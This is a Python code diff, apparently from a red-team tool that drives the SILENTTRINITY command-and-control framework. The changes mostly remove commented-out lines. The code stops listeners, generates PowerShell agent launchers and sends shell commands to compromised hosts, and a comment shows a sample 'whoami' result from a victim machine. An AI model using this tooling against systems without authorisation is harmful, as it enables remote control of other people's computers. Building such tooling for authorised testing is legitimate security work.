@@ -314,16 +314,11 @@ class SilentTriHTTPListenerType(ListenerType):
         stop_listener = {"id": gen_random_string(), "ctx": "listeners", "cmd": "stop", "args": {"name": listener_internal_id}, "data": {}}
         await connection.send(stop_listener)
 
-        # logger.error('-->response: %r',response)
-
         response = await  connection.recv()
         logger.error('response: %r',response)
 
-        # result = response.get('result')
-
         dto = ResponseDto(
             successful_transaction=True,
-
         )
         return dto
 
@@ -332,13 +327,6 @@ class SilentTriPowershellLauncherType(LauncherType):
     name = 'Powershell Launcher'
     description = 'Uses powershell.exe to launch Agent using [systemm.reflection.assemly::load()'
     registered_options = [
-        # OptionDesc(
-        #     name='Delay',
-        #     description='Amount of time that Agent will take the agent to contact the listener in seconds',
-        #     example='5',
-        #     field_type='integer',
-        #     required=True
-        # ),
     ]
 
     def __init__(self, url: str,  _c2: SilentTriC2) -> None:
@@ -372,13 +360,10 @@ class SilentTriPowershellLauncherType(LauncherType):
         await connection.send(set_powershell_stagless)
         await connection.recv()
 
-        # logger.error('RequestDto.listener: %r ', RequestDto)
         listener_name = dto.listener.listener_internal_id
         set_generate = {"id": gen_random_string(), "ctx": "stagers", "cmd": "generate", "args": {"listener_name": listener_name}, "data": {}}
         await connection.send(set_generate)
         response = await connection.recv()
-        # await ws.send(json.dumps(set_generate))
-        # response = await recv_(ws)
         result = response.get('result')
 
         launcher = CreateLauncherDto(
@@ -414,6 +399,7 @@ class PowershellAgentType(AgentType):
         # ---> {"id": "tfwCJrSKZf", "ctx": "modules", "cmd": "run", "args": {"guids": ["b0c71f5e-660b-4f93-b722-9df523b4b063"]}, "data": {}}
         # <--- {"type": "message", "id": "tfwCJrSKZf", "ctx": "modules", "name": "run", "status": "success", "result": null}
         # <--- {"type": "event", "name": "JOB_RESULT", "data": {"id": "Aw8lrj6luD", "output": "[*] Path: C:\\WINDOWS\\System32 Command: whoami Args: \r\ndesktop-2ld29pj\\criso\r\n\r\n", "session": "b0c71f5e-660b-4f93-b722-9df523b4b063", "address": "192.168.0.117"}}
+
         # [*] [TS-UM5UF] b0c71f5e-660b-4f93-b722-9df523b4b063 returned job result (id: Aw8lrj6luD)
         # [*] Path: C:\WINDOWS\System32 Command: whoami Args: 
         # desktop-2ld29pj\criso
@@ -423,20 +409,15 @@ class PowershellAgentType(AgentType):
         set_ctx = {"id": gen_random_string(), "ctx": "modules", "cmd": "use", "args": {"name": "boo/shell"}, "data": {}}
         await connection.send(set_ctx)
         await connection.recv()
-        # await ws.send(json.dumps(set_ctx))
-        # await recv_(ws)
         
         set_cmd = {"id": gen_random_string(), "ctx": "modules", "cmd": "set", "args": {"name": "command", "value": command}, "data": {}}
         await connection.send(set_cmd)
         await connection.recv()
-        # await ws.send(json.dumps(set_ctx))
-        # await recv_(ws)
 
         set_run = {"id": gen_random_string(), "ctx": "modules", "cmd": "run", "args": {"guids": [shell_dto.agent_internal_id]}, "data": {}}
         await connection.send(set_run)
         response = await connection.recv()
-        # await ws.send(json.dumps(set_ctx))
-        # response = await recv_(ws)
+
         result = response['result']
         response_dto = {'content': result['output']}
         return response_dto
